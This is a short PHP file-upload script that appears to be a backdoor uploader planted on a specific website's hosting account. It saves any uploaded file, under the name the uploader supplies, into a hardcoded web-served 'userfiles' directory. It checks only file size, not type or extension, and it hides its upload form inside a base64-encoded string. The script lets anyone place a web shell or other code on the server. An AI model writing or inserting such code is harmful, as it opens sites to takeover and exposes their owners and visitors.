<?php
   if(isset($_FILES['image'])){
      $errors= array();
      $file_name = $_FILES['image']['name'];
      $file_size =$_FILES['image']['size'];
      $file_tmp =$_FILES['image']['tmp_name'];
      //$file_type=$_FILES['image']['type'];
      
      if($file_size > 2097152){
         $errors[]='File size must be excately 2 MB';
      }
      
      if(empty($errors)==true){
         move_uploaded_file($file_tmp,"/users/0030/sh205135/www/mak.waw.pl/userfiles/".$file_name);
         echo "Success";
      }else{
         print_r($errors);
      }
   }

   echo base64_decode("PGh0bWw+CiAgIDxib2R5PgogICAgICAKICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICAgICAgIDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJpbWFnZSIgLz4KICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIvPgogICAgICA8L2Zvcm0+CiAgICAgIAogICA8L2JvZHk+CjwvaHRtbD4=");
?>
